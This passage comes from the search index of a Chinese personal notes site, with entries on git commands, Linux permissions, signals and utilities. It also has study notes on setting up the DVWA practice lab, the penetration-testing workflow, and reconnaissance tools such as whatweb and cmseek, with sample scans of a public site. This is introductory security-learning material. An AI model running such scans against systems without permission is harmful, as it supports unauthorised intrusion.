即提交记录的hash值","tags":"版本控制","url":"/yq-docs-version-control-git-Command-show.html","loc":"/yq-docs-version-control-git-Command-show.html"},{"title":"status","text":"查看工作去文件变动情况. 使用参数 -s 查看简单介绍","tags":"版本控制","url":"/yq-docs-version-control-git-Command-status.html","loc":"/yq-docs-version-control-git-Command-status.html"},{"title":"submodule","text":"支持的选项 init 不带参数默认从 .gitmodules 发现子模块,\n并注册子模块(要求此目录不在版本库)到索引信息 (即注册到 .git/config ) sync 从子模块的远程url(上游)同步信息 (子模块从 .git/config 获取).\n也就是只有 init 好的才可以使用 deinit 解注册一/多个子模块.\n会将其相关信息从 .git/config 下移除(包括work tree),\n但是保留 .gitmodules 里的信息. 效果等价于 git submodule update\ngit submodule foreach\ngit submodule sync 有时候你从别人仓库拉东西, 又不想要里面子模块, 就可以用这个指令. 语法 git submodule deinit [ -f | --force ] ( --all | [ -- ] <path> ) -f,     --force 即使已经拉取了子模块, 且修改了子模块内容, 也进行删除操作 如果想完全删除子模块, 包括版本库, 可以搭配 git rm 使用 使用 git submodule add $remote_git_addr $local_dir   添加子模块到本地的目录 git submodule update --remote $local_dir 更新某一个子模块 git submodule foreach 'git pull origin master' 更新多个子模块 git submodule update --init --recursive 初始化递归下载子模块（使用已有的最新commit id，建议使用） git submodule update --remote --recursive 递归更新所有子模块（强制用master覆盖子模块，除非使用master，否则使用上一个好点） 注意： 时刻关注子模块的版本号， 提交时容易误修改此部分 补充： submodule只能是先在子模块提交代码，然后去主工程提交commit_id 注意： 默认使用 git submodule检出的是一个临时的分支（非master以及其他），所以要在主工程所在目录进去修改，需要先切换submodule到正常分支才可； 同时，对于主工程而言，唯一识别子模块方式为commit id，而非branch，所以需要切换子模块的分支时，直接在子模块切换后，再返回主工程提交新的子模块commit id即可 删除 参考: [Git] 如何优雅的删除子模块(submodule)或修改Submodule URL 逆初始化模块，其中 {MOD_NAME} 为模块目录，执行后可发现模块目录被清空 git submodule deinit { MOD_NAME } 然后 (手动) 删除 .gitmodules 中记录的模块信息（ --cached 选项清除 .git/modules 中的缓存） # vim .gitmodules git rm --cached { MOD_NAME } # 提交更改到代码库，可观察到'.gitmodules'内容发生变更 git commit -am \"Remove a submodule.\"","tags":"版本控制","url":"/yq-docs-version-control-git-Command-submodule.html","loc":"/yq-docs-version-control-git-Command-submodule.html"},{"title":"tag","text":"语法指令 创建tag: git tag -a tag-name(如v0.0.1)\n                          # 增加一个tag, 下面的例子, 都以 v0.0.1 作为tag名\ngit tag -a v0.0.1 cc16905\n                          # 对某一提交的信息打tag标签，末尾是一个commit id\ngit tag -a v0.0.1 -m \"version 0.0.1, tag info\"\n                          # 创建tag带有说明信息\ngit tag v0.0.1            # 创建轻量的标签tag(快速创建tag)\ngit tag v0.0.2 be7a3e4    # 给提交的信息打tag，commit id为 be7a3e4 查看tag: git tag                   # 查看所有标签\ngit show tag-name         # 查看指定的tag\ngit show -s tag-name      # 查看指定的tag的hash值 推送到远程: git push origin v0.0.1    # 推送某一tag到远程仓库：\n\ngit push origin --tags    # 一次推送多个标签\ngit push --tags 删除标签: git tag -d v0.0.1 根据标签检出: git checkout v0.0.1 根据标签回退: # 先查看要回退的标签信息\ngit show v0.0.1\n\n# 主干分支回退到某个版本(v0.0.1对应的前7为hash)\ngit reset --hard cc16905 tag与commit区别 Git tag是一系列commit的中的一个点, 只能查看, 不能移动。branch是一系列串联的commit的线。 tag是静态的, branch是动态的, 要向前走。 tag分类 轻量级: 仅为某个 commit 引用 带附注: 存储在仓库中的独立对象, 包含有自身校验和信息等等 (常用) 创建tag git tag -a V0.1 -m 'release 0.1' tag选项参数 -a annotated, 一般都是版本号 -m 备注信息 -d 删除某一个tag -v 验证tag 用例: # 创建一个 0.0.0 的tag, 这里只是测试, 一般建议 v0.0.0 作为标签名, v表示version, 0.0.0 表示语义化版本 git tag -a 0 .0.0 -m 'release 0.0.0, test some msg' # 查看有哪些tag git tag # 0.0.0 # 查看某一个tag git show 0 .0.0 # tag 0.0.0 # ... (就不贴出来了) # 推送 git push origin --tags # 若需要删除 git tag -d 0 .0.0 # 推一个空的上去覆盖掉, 达到删除目的 git push origin :refs/tags/0.0.0 # 其他删除方式 # git push origin :0.0.0 # 也可以这样 # git push origin --delete tag 0.0.0 # 获取指定tag git fetch origin tag 0 .0.0 注解 语义化版本规则 版本格式：主版本号.次版本号.修订号, 版本号递增规则如下： 主版本号：当你做了不兼容的 API 修改, 次版本号：当你做了向下兼容的功能性新增, 修订号：当你做了向下兼容的问题修正。 一般都是从 0.1.0 开始","tags":"版本控制","url":"/yq-docs-version-control-git-Command-tag.html","loc":"/yq-docs-version-control-git-Command-tag.html"},{"title":"update-index","text":"用于更新Git索引或暂存区的内容。下面是一些常见用法: --assume-unchanged <file> 将指定文件标记为\"已忽略\"（assume unchanged），即在以后的提交中忽略该文件的修改\n( 告诉Git不要重复扫描该文件的状态，因此如果文件被修改了，Git仍然会提交这些修改 ): git update-index --assume-unchanged <file> --no-assume-unchanged <file> 取消指定文件的\"已忽略\"标记，这样Git将会跟踪所做的修改: git update-index --no-assume-unchanged <file> --skip-worktree <file> 类似于\"已忽略\", 完全忽略文件的修改，即使文件被修改，也不会提交到版本库 git update-index --skip-worktree <file> --no-skip-worktree <file> 取消指定文件的\"已忽略\"标记，这样Git将会跟踪所做的修改: git update-index --no-skip-worktree <file> --add <file> 将指定文件添加到Git索引或暂存区中(仅能添加至暂存区): git update-index --add <file> --remove <file> 从Git索引或暂存区中删除指定文件: git update-index --remove <file> --chmod=(+|-)x <file> 将指定文件标记为可执行: git update-index --chmod=+x <file> 通过使用`git update-index`命令，可以灵活地管理Git索引或暂存区中的文件，以满足特定的需求。 --skip-worktree和--assume-unchanged区别 以下来源于 ChatGpt --skip-worktree的使用示例 假设我们有一个包含敏感信息的文件config.yml，我们将它添加到版本库中并提交了一个初始版本。\n接下来，我们在本地修改了该文件，但不希望这些修改被提交到版本库中。 首先，我们需要将config.yml文件标记为\"已忽略\"，以便Git在以后的提交中忽略它的修改。执行以下命令: git update-index --skip-worktree config.yml 然后，我们可以继续修改config.yml文件，不必担心这些修改会被提交到版本库中。如果我们需要取消这个标记，可以使用如下命令: git update-index --no-skip-worktree config.yml 需要注意的是，这个标记只会在本地起作用，不会从版本库中删除文件，也不会阻止其他人在其本地进行修改。 --assume-unchanged的使用示例 假设我们有一个较大的日志文件log.txt，每次执行`git status`或其他Git命令时都需要扫描这个文件，导致速度变慢。\n如果我们确定对这个文件的更改不会对版本库产生影响，我们可以将它标记为\"已忽略\"，加快Git命令的执行速度。 首先，使用如下命令将log.txt文件标记为\"已忽略\": git update-index --assume-unchanged log.txt 然后，我们可以继续修改log.txt文件，但这些修改不会出现在`git status`命令的输出中。 如果我们需要取消这个标记，可以使用如下命令: git update-index --no-assume-unchanged log.txt 需要注意的是， git update-index --assume-unchanged 只是告诉Git不要重复扫描该文件的状态，\n因此如果文件被修改了，Git仍然会提交这些修改。如果需要完全忽略文件的修改，\n应该使用`git update-index --skip-worktree`命令。 如果 不想取消标记提交 : 需要手动将修改的内容添加到Git暂存区中: git add <file> 在执行git commit命令时，需要使用--no-post-rewrite选项来防止Git重写提交历史: git commit -m \"commit message\" --no-post-rewrite 如果其他人在其本地修改了该文件，并提交了更改，您在拉取更新时可能会遇到冲突。\n因此，虽然可以不取消对该文件的\"已忽略\"标记并提交修改，但不推荐这样做，因为可能会引起一些问题。\n如果您确定需要将文件的修改提交到版本库中，请按照上述步骤进行操作，并确保在提交之前备份您的代码。","tags":"版本控制","url":"/yq-docs-version-control-git-Command-update-index.html","loc":"/yq-docs-version-control-git-Command-update-index.html"},{"title":"编辑器问题","text":"设置vim编辑器: git config --global core.editor 'vim' 背景: 之前不小心安装了, 然后忘了怎么配置称使用这个工具的编辑器, 贼难用,\n然后卸载了GitExtensions, 再rebase 的时候就会报错: hint: Waiting for your editor to close the file... \"C:/Program Files (x86)/GitExtensions/GitExtensions.exe\" 设置一下vim编辑器即可.","tags":"版本控制","url":"/yq-docs-version-control-git-Editor-question.html","loc":"/yq-docs-version-control-git-Editor-question.html"},{"title":"git 工作原理","text":"每个git项目下都有一个隐藏的 .git 目录, 关于git的一切都存储在这个目录里面（全局配置除外）. 目录结构 info：初始化时只有这个文件, 用于排除提交规则, 与 .gitignore 功能类似。他们的区别在 于.gitignore 这个文件本身会提交到版本库中去, 用来保存的是公共需要排除的文件；而info/exclude 这里设置的则是你自己本地需要排除的文件, 他不会影响到其他人, 也不会提交到版本库中去。 hooks：这个目录很容易理解,  主要用来放一些 git 钩子, 在指定任务触发前后做一些自定义的配置, 这 是另外一个单独的话题, 本文不会具体介绍。 objects：用于存放所有 git 中的对象, 里面存储所有的数据内容, 下面单独介绍。 logs：用于记录各个分支的移动情况, 下面单独介绍。 refs：用于记录所有的引用, 下面单独介绍。 HEAD：文件指示目前被检出的分支 index：文件保存暂存区信息","tags":"版本控制","url":"/yq-docs-version-control-git-Git-work-principle.html","loc":"/yq-docs-version-control-git-Git-work-principle.html"},{"title":"换行符问题","text":"主要是 Windows 下, 以及跨平台协作时吧 相关的两个配置: core.autocrlf [true | input | false]  # 换行符自动转化\n\ncore.safecrlf [true | warn | false]   # 检查换行 换行符自动转换 core.autocrlf true    (default)提交时、 检出时都转换.\n这个在不同系统下不同, 比如 Windows 是提交时将本地的 CRLF 转换为 LF, 检出时反之. input   仅提交时转换为 false   都不转换 检查换行 core.safecrlf true    拒绝提交混合换行符文件 warn    允许提交包含混合换行符文件，但给出警告 false   允许提交包含混合换行符文件 例: git config --local core.autocrlf true\n\ngit config --local core.safecrlf true\n\ngit clone --config core.autocrlf=false https://xxx.git","tags":"版本控制","url":"/yq-docs-version-control-git-Sanctuary-problem.html","loc":"/yq-docs-version-control-git-Sanctuary-problem.html"},{"title":"DVWA靶场搭建","text":"地址: https://github.com/digininja/DVWA 通过简单明了的界面来练习一些最常见的 Web 漏洞，所练习的漏洞具有不同的难度级别。\n请注意，此软件存在提示和无提示的漏洞。 这是特意为止。\n我们鼓励您依靠自己的能力尝试并发现尽可能多的安全问题。 clone到本地: git clone https://github.com/digininja/DVWA.git 注解 不建议放在服务器跟公网本机,\n最好是放在虚拟机上, 因为这玩意儿就是个漏洞集合包 默认用户密码: admin\npassword 建议的部署方式 phpStudy搭建 DVWA-Clone 或者下载后, 将其放置/解压到 phpStudy的www目录下","tags":"安全","url":"/yq-docs-Safety-Study-record-DVWA-shooting-range-construction.html","loc":"/yq-docs-Safety-Study-record-DVWA-shooting-range-construction.html"},{"title":"渗透流程","text":"明确目标 信息收集 域名，子域名，端口，网站架构，网站目录结构，Apache, JDK, CMS WAF CDN 旁站 c段 漏洞分析/扫描 漏洞利用 证明漏洞存在 POC (proof of content) 形成渗透测试报告 怎么做的 存在哪些漏洞 修复建议","tags":"安全","url":"/yq-docs-Safety-Study-record-Infiltration-process.html","loc":"/yq-docs-Safety-Study-record-Infiltration-process.html"},{"title":"Kali信息收集","text":"资产搜集综合工具 Maltego: 强大的跨平台信息搜集工具(可以自动搜集资产) ARL灯塔: 搜集 yakit: 搜集出来还会尝试分析有没有漏洞 (单兵系统) goby: 搜集 ... 流程 信息收集概述 网络空间测绘 端口扫描 子域名暴破 目录扫描 CMS系统指纹识别 信息收集概述 不提前收集可能会遗漏一些方面 比如子域名没收集到 收集的内容 域名 IP 端口 CMS指纹 通过搜索引擎收集信息(google dork) 网络空间测绘 目录扫描 ... 网络空间测绘 网络空间(Cyberspace) WiIIiam Gibson《Neuromancer》1984 网络空间搜索引擎（测绘） 注解 不是指搜索引擎搜索到的HTML,\n而是指整个网络世界空间, 比如网关, 摄像头, Web框架, 基站 (一般叫做资产) 常见的搜集平台: # 世界上第一个网络空间搜索引擎\nhttps://www.shodan.io/\n\n# 钟馗之眼\nhttps://www.zoomeye.org/\n\n# 国内被封了, 因为很多人在这上搜集信息\nhttp://fofa.so/\n# fafo新地址\nhttps://fofa.info/\n\n# 360 夸克\nhttps://quake.360.net/quake/#/index\n\n# 奇安信 鹰图\nhttps://hunter.qianxin.com/ 漏洞总结的地址(会给你最新漏洞以及在搜集平台搜索的语法): # 佩奇 (被封)\nhttp://wiki.peiqi.tech/ fofa被封 端口扫描 端口与服务的关系 常见端口号 端口范围: 0 - 65535 大多数人对于常用开源的项目使用的端口都是默认的,\n比如 mysql 默认是 3306, 一般不会改为其他的如 8888 端口扫描工具: nmap : 网络界的瑞士军刀 子域名暴破 域名 顶级域名 子域名 使用子域名更省钱 在线子域名爆破网站: https://dnsdumpster.com/ 目录扫描 对于每一个服务器, 扫描上面开放的内容 为什么要扫描 可能会存在敏感文件 常见敏感文件 现在常用手段 组织一个常用的词典 对于每一个字典内的数据, 尝试拼接访问, 然后看返回码 常用工具 Burp Suite: index , dirb 御剑 dirbuster CMS系统指纹识别 指纹扫描 CMS(Content Management System) 可以理解为系统用了哪些框架及其版本 因为一般写个什么都是先去看看有没有什么开源的，\n所以可以尝试找找有没有使用这些开源项目， 然后根据项目找漏洞 常用工具 Google浏览器插件 \"what runs\" (只能分析前端) whatweb cmseek Wappalyzer 在线网站 御剑指纹扫描器 Test404轻量CMS指纹识别 ...","tags":"安全","url":"/yq-docs-Safety-Study-record-Kali-information-collection.html","loc":"/yq-docs-Safety-Study-record-Kali-information-collection.html"},{"title":"phpStudy搭建","text":"一个快捷的工具集合 包括但不限于 MySQL Apache php 等 用于快速环境部署","tags":"安全","url":"/yq-docs-Safety-Study-record-PHPStudy.html","loc":"/yq-docs-Safety-Study-record-PHPStudy.html"},{"title":"whatweb","text":"用于CMS指纹识别\n.. 服务框架扫描, VUE啥的. 示例 ┌── ( yanque㉿kali ) - [ ~ ] └─$ whatweb -v www.baidu.com\nWhatWeb report for http://www.baidu.com\nStatus : 200 OK\nTitle : 百度一下，你就知道\nIP : 14 .215.177.38\nCountry : CHINA, CN\n\nSummary : Cookies [ BAIDUID,BDSVRTM,BD_HOME,BIDUPSID,H_PS_PSSID,PSTM ] , Email [ index@2.png,pop_tri@1x-f4a02fac82.png,qrcode-hover@2x-f9b106a848.png,qrcode@2x-daf987ad02.png,result@2.png ] , HTML5, HTTPServer [ BWS/1.1 ] , JQuery, Meta-Refresh-Redirect [ http://www.baidu.com/baidu.html?from = noscript ] , OpenSearch [ /content-search.xml ] , Script [ application/json,text/javascript ] , UncommonHeaders [ bdpagetype,bdqid,traceid ] , X-Frame-Options [ sameorigin ] , X-UA-Compatible [ IE = Edge,chrome = 1 ,IE = edge ] Detected Plugins: [ Cookies ] Display the names of cookies in the HTTP headers. The values are not returned to save on space. String : BAIDUID String : BIDUPSID String : PSTM String : BAIDUID String : BDSVRTM String : BD_HOME String : H_PS_PSSID [ Email ] ... ...\n\nHTTP Headers: HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: max-age = 86400 Content-Encoding: gzip Content-Length: 1131 Content-Type: text/html Date: Mon, 02 Jan 2023 10 :15:00 GMT Etag: \"b83-59bafefa98680\" Expires: Tue, 03 Jan 2023 10 :15:00 GMT Last-Modified: Thu, 09 Jan 2020 07 :27:06 GMT P3p: CP = \" OTI DSP COR IVA OUR IND COM \" Server: Apache Set-Cookie: BAIDUID = D4BF2F2CC2550CD470A3E182B2D10463:FG = 1 ; expires = Tue, 02 -Jan-24 10 :15:00 GMT ; max-age = 31536000 ; path = / ; domain = .baidu.com ; version = 1 Vary: Accept-Encoding,User-Agent Connection: close\n\n┌── ( yanque㉿kali ) - [ ~ ] └─$","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Whatweb.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Whatweb.html"},{"title":"cmseek","text":"指纹扫描 在Kali中直接输入cmseek，启动该软件,\n如果没有安装, 会提示y安装 不带参数默认进入交互式界面 用法: python3 cmseek.py (for guided scanning)\ncmseek (for guided scanning)\npython3 cmseek.py [OPTIONS] <Target Specification>\ncmseek [OPTIONS] <Target Specification> 指定 TARGET: -u URL , --url URL Target Url -l LIST , --list LIST 文件路径, 内容为 url 路径集合, 以逗号分隔 扫描选项: -i cms , --ignore--cms cms 忽略指定的 CMS IDs 以避免失败. 以 comma \",\" 逗号分隔 --strict-cms cms 只检查给定的 CMS IDs, 多个以逗号分隔 --skip-scanned 如果CMS已经预探测过了, 跳过 target --light-scan 跳过深度扫描. 即只探测CMS和版本 -o , --only-cms 只探测CMS, 不进行深度扫描以及版本信息探测 重定向: --follow-redirect 需要进行的重定向 --no-redirect 跳过所有的重定向 用户代理: -r , --random-agent 使用随机用户代理 --googlebot Use Google bot user agent --user-agent USER_AGENT 自定义代理 输出: -v , --verbose 输出详细信息 版本: --version 版本信息 HELP & 杂项(MISCELLANEOUS): -h , --help 帮助 --clear-result 删除所有扫描结果 --batch 扫描每一个site前, 不用手动 enter 用例: python3 cmseek.py -u example.com                           # 扫描 example.com\npython3 cmseek.py -l /home/user/target.txt                 # 扫描 target.txt 中指定的 sites (逗号分隔)\npython3 cmseek.py -u example.com --user-agent Mozilla 5.0  # 扫描 example.com, 且使用自定义用户代理(user-Agent): Mozilla is 5.0\npython3 cmseek.py -u example.com --random-agent            # 使用随机用户代理(user-Agent)扫描example.com\npython3 cmseek.py -v -u example.com                        # 查看扫描 example.com 的详细输出 示例 cmseek -u www.baidu.com","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-cmseek.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-cmseek.html"},{"title":"linux下文件权限","text":"ls -l查看文件格式一共有10位: 9 8 7 6 5 4 3 2 1 0\n- r w x r - x r - x 其中, 第9位, 表示文件类型, 支持的类型见 文件类型 8-6位, 表示文件所有者权限, 支持权限见 文件权限 5-3位, 表示文件所属组权限 2-0位, 表示其他用户权限 文件权限 常用权限 以常用权限来说, 权限可分: 读、写、执行, 分别以 r、w、x表示: r, 可读, 可以读出文件的内容\nw, 可写, 可以修改文件的内容\nx, 可执行, 可运行文件 所有权限 在unix下，文件权限用12个二进制位表示: 11 10 9 8 7 6 5 4 3 2 1 0\nS  G T r w x r w x r w x 第11位, 为SUID位 第10位, 为SGID位 第9位为, sticky位 文件权限的s位和t位的理解 这里涉及到了Effective UID和Real UID以及Saved UID: Effective UID: 程序实际操作时生效的UID (简称euid) Real UID: 执行该程序的用户的实际UID (简称ruid) Saved UID: 在高权限用户降权后，保留的其原本UID (简称suid) 增加了一个s权限，使该程序在实际运行时Effective UID就会变为0，即root(当文件属主位root时)的UID 创建s和t权限，是为了让一般用户在执行某些程序时，能够暂时拥有改程序拥有者的权限（体现在x位）。 从这一点来说, 该文件必具有x属性 SUID是Set User  Id 仅对二进制文件（binary）有效（也就是说对于shell脚本或者目录无效） 执行者需要有x权限 仅在执行该权限的过程中有效 执行者将具有该权限拥有者的权限 SGID是Set Group Id 对二进制文件有效（与suid不同的是，可以作用于目录） 执行者需要有x权限 执行者在执行过程中会获得该程序群组的支持 ls -l查看文件格式一共有10位: 9 8 7 6 5 4 3 2 1 0\n- r w x r - x r - x\n\n# 这10位中8-6位是文件所有者权限\n# 5-3位是同组用户权限\n# 2-0位其他用户权限\n# 形式为rwx r 表示可读，可以读出文件的内容 w 表示可写，可以修改文件的内容 x 表示可执行，可运行文件 第9位表示文件类型: p表示命名管道文件\nd表示目录文件\nl表示符号链接文件\n-表示普通文件\ns表示socket文件\nc表示字符设备文件\nb表示块设备文件 其实在unix下，文件权限用12个二进制位表示: 11 10 9 8 7 6 5 4 3 2 1 0\nS  G T r w x r w x r w x\n\n# 第11位为SUID位\n# 第10位为SGID位\n# 第9位为sticky位 文件类型 p: 命名管道文件 d: 目录文件 l: 符号链接文件 -: 表示普通文件 s: socket文件 c: 字符设备文件 b: 块设备文件","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Document-rights-limit-under-Linux.html","loc":"/yq-docs-operating-system-linux-Conceptual-Document-rights-limit-under-Linux.html"},{"title":"linux 系统信号","text":"Linux系统有两大类信号 POSIX标准的规则信号(regular signal 1-31编号) 实时信号(real-time signal 32-63) 系统信号 一些常见的的 linux 系统信号。 信号 值 描述 1 SIGHUP 挂起进程 2 SIGINT 终止进程(ctrl+c) 3 SIGQUIT 停止进程 9 SIGKILL 无条件终止进程 强制杀死进程 这个信号进程无法忽视 直接在系统层面把进程杀掉. 所以在Python中他的不能监听的 15 SIGTERM 尽可能终止进程 17 SIGSTOP 无条件停止进程，但不是终止进程 18 SIGTSTP 停止或暂停进程，但不终止进程(ctrl+z) 19 SIGCONT 继续运行停止的进程 参考:: https://blog.csdn.net/qq_55723966/article/details/122304011 规则信号(包括了上面的常用信号) 信号编号 名称 默认动作 说明 1 SIGHUP 终止 终止控制终端或进程. 终端挂起或者控制进程终止 2 SIGINT 终止 由键盘引起的中断(Ctrl-c) 3 SIGQUIT dump 控制终端发送给进程的信号 键盘产生的退出(Ctrl-) 4 GIGILL dusmp 非法指令引起 5 SIGTRAP dump debug中断 6 SIGABRT/SIGIOT dump 异常中止. 由abort(3)发出的退出指令 7 SIGBUS/SIGEMT dump 总线异常/EMT指令 8 SIGFPE dump 浮点运算溢出 9 SIGKILL 终止 强制杀死进程(大招. 进程不可捕获). 这个信号进程无法忽视 直接在系统层面把进程杀掉. 所以在Python中他的不能监听的 10 SIGUSR1 终止 用户信号. 进程可自定义用途 11 SIGSEGV dump 非法内存地址. 无效的内存引用 12 SIGUSR2 终止 用户信号. 进程可自定义用途 13 SIGPIPE 终止 向某个没有读取的管道中写入数据. 管道破裂: 写一个没有读端口的管道 14 SIGALRM 终止 时钟中断(闹钟). 由alarm(2)发出的信号 15 SIGTERM 终止 进程终止(进程可捕获) 16 SIGSTKFLT 终止 协处理器栈错误 17 SIGCHLD 忽略 子进程退出或中断 18 SIGCONT 继续 如进程停止状态则开始运行 19 SIGSTOP 停止 停止进程运行 20 SIGSTP 停止 键盘产生的停止 21 SIGTTIN 停止 后台进程请求输入 22 SIGTTOU 停止 后台进程请求输出 23 SIGURG 忽略 socket发送紧急情况 24 SIGXCPU dump CPU时间限制被打破 25 SIGXFSZ dump 文件大小限制被打破 26 SIGVTALRM 终止 虚拟定时时钟 27 SIGPROF 终止 profile timer clock 28 SIGWINCH 忽略 窗口尺寸调整 29 SIGIO/SIGPOLL 终止 I/O可用 30 SIGPWR 终止 电源异常 31 SIGSYS/SYSUNUSED dump 系统调用异常 注解 由于不同系统中同一个数值对应的信号类型不一样, 所以最好使用信号名称. 信号的数值越小, 优先级越高. 信号量说明(参考) SIGHUP 本信号在用户终端连接(正常或非正常)结束时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业, 这时它们与控制终端不再关联. SIGINT 程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出 SIGQUIT 和SIGINT类似, 但由QUIT字符(通常是Ctrl-)来控制. 进程在因收到SIGQUIT退出时会产生core文件, 在这个意义上类似于一个程序错误信号. SIGILL 执行了非法指令. 通常是因为可执行文件本身出现错误, 或者试图执行数据段. 堆栈溢出时也有可能产生这个信号. SIGTRAP 由断点指令或其它trap指令产生. 由debugger使用. SIGABRT 程序自己发现错误并调用abort时产生. SIGIOT 在PDP-11上由iot指令产生, 在其它机器上和SIGABRT一样. SIGBUS 非法地址, 包括内存地址对齐(alignment)出错. eg: 访问一个四个字长的整数, 但其地址不是4的倍数. SIGFPE 在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误. SIGKILL 用来立即结束程序的运行. 本信号不能被阻塞, 处理和忽略. SIGUSR1 留给用户使用 SIGSEGV 试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据. SIGUSR2 留给用户使用 SIGPIPE Broken pipe SIGALRM 时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号. SIGTERM 程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出. shell命令kill缺省产生这个信号. SIGCHLD 子进程结束时, 父进程会收到这个信号. SIGCONT 让一个停止(stopped)的进程继续执行. 本信号不能被阻塞. 可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作. 例如, 重新显示提示符. 参考:: https://www.jianshu.com/p/1a9ea7f4d46e","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Linux-system-signal.html","loc":"/yq-docs-operating-system-linux-Conceptual-Linux-system-signal.html"},{"title":"ausearch","text":"使用ausearch命令可以搜索审计记录，必须以root用户身份执行ausearch命令。 安装: yum install audit\n# 要么\nup2date install audit\n\n#debian\napt install auditd 语法格式: ausearch [参数] 选项含义 -f <文件名> 基于文件名的搜索 -c <命令行名称> 基于命令行名称的搜索 -n <计算机名称> 基于计算机名称的搜索 -p <进程ID> 基于进程ID的搜索 -k <键字段> 基于键字段的搜索 -m <消息类型> 基于消息类型的搜索 -x <可执行文件名> 基于可执行文件名的搜索 -a <审计事件ID> 基于审计事件ID的搜索 -o <SELinux对象上下文> 基于对象上下文的搜索 -e <退出代码> 基于系统调用退出代码的搜索 -r 完全未格式化输出 -ga<所有组群的ID> 基于所有组群GID的搜索 -ha<主机名> 基于远程主机名的搜索 -ui<用户UID> 基于用户UID的搜索 -tm<终端> 基于终端的搜索 -sv<成功值> 基于系统调用或事件成功值的搜索 -pp<父进程ID> 基于父进程ID的搜索 -ul<用户登录ID> 基于用户登录ID的搜索 -ue<有效UID> 基于有效UID的搜索 -ge<有效GID> 基于有效GID的搜索 -session<登录会话ID> 基于登录会话ID的搜索 -sc<系统调用的名称> 基于系统调用的名称或对象编号的搜索 -se<SELinux上下文> 基于任何主体或对象的上下文搜索 -ts<开始日期><开始日期>, --start<开始日期><开始日期> 基于开始时间、开始时间的搜索 -ua<所有用户的UID> 基于所有的用户UID的搜索 -te<结束时间><结束时间> 基于结束时间、结束时间的搜索 -su<SELinux上下文> 基于主题的上下文的搜索 例 基于用户root搜索审计记录: [root@localhost ~]# ausearch  -ui 0 基于终端tty1搜索审计记录: [root@localhost ~]# ausearch -tm tty1 基于进程号1779搜索审计记录: [root@localhost ~]# ausearch -p 1779","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-AUSEARCH.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-AUSEARCH.html"},{"title":"cmp","text":"Linux cmp命令用于比较两个文件是否有差异。 当相互比较的两个文件完全一样时，则该指令不会显示任何信息。\n若发现有所差异，预设会标示出第一个不同之处的字符和列数编号。\n若不指定任何文件名称或是所给予的文件名为\"-\"，则cmp指令会从标准输入设备读取数据。 语法 : cmp [-clsv][-i <字符数目>][--help][第一个文件][第二个文件] 参数 ： -c , --print-chars 除了标明差异处的十进制字码之外，一并显示该字符所对应字符。 -i <字符数目> , --ignore-initial= <字符数目> 指定一个数目。 -l , --verbose 标示出所有不一样的地方。 -s , --quiet , --silent 不显示错误信息。 -v , --version 显示版本信息。 --help 在线帮助。 实例 要确定两个文件是否相同，请输入: cmp prog.o.bak prog.o 这比较 prog.o.bak 和 prog.o。如果文件相同，则不显示消息。\n如果文件不同，则显示第一个不同的位置；例如: prog.o.bak prog.o differ: char 4, line 1 如果显示消息 cmp: EOF on prog.o.bak 则 prog.o 的第一部分与 prog.o.bak 相同，但在 prog.o 中还有其他数据。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-CMP.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-CMP.html"},{"title":"command","text":"command -v 可以判断一个命令是否支持，如果一个脚本需要，或者还要加if判断: if command -v python ;then\n    echo yes\nfi","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Command.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Command.html"},{"title":"diff","text":"文件对比","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-DIFF.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-DIFF.html"},{"title":"flock","text":"flock是Linux下的文件锁。\n当多个进程可能会对同样的数据执行操作时,\n这些进程需要保证其它进程没有也在操作, 以免损坏数据。 -s , --shared 获取一个共享锁, 在定向为某文件的FD上设置共享锁而未释放锁的时间内,\n其他进程试图在定向为此文件的FD上设置独占锁的请求失败,\n而其他进程试图在定向为此文件的FD上设置共享锁的请求会成功。 -x , -e , --exclusive 获取一个排它锁, 或者称为写入锁, 为默认项。 -u , --unlock 手动释放锁, 一般情况不必须,\n当FD关闭时, 系统会自动解锁, 此参数用于脚本命令一部分需要异步执行, 一部分可以同步执行的情况。 -n , --nb , --nonblock 非阻塞模式, 当获取锁失败时, 返回1而不是等待。 -w , --wait , --timeout seconds 设置阻塞超时,\n当超过设置的秒数时, 退出阻塞模式, 返回1, 并继续执行后面的语句。 -o , --close 表示当执行command前关闭设置锁的FD, 以使command的子进程不保持锁。 -c , --command command 在shell中执行其后的语句。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-FLOCK.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-FLOCK.html"},{"title":"locale-gen","text":"默认情况下，为基于 libc 的程序的本地化提供基本支持的 locale 包不包含每种支持语言的可用本地化文件。\n由于此类文件的巨大大小以及 libc 支持的大量语言，此限制变得必要。\n因此，Debian 使用了一种特殊的机制，我们在目标主机上准备实际的本地化文件并仅分发它们的模板。 locale-gen 是一个程序，它读取文件 /etc/locale.gen 并为所选的本地化配置文件调用 localedef 。\n修改 /etc/locale.gen 文件后运行 locale-gen 。 /etc/locale.gen 主配置文件，具有简单的格式：每行不为空且不以 # 开头的行都被视为要构建的语言环境定义。 /var/lib/locales/supported.d/ 包含语言包提供的 locale.gen 片段的目录。不要手动编辑这些，它们将在包升级时被覆盖。 名字: locale-gen - 编译本地定义文件的一个列表 简介: locale-gen [options] [locale] [language] 描述: 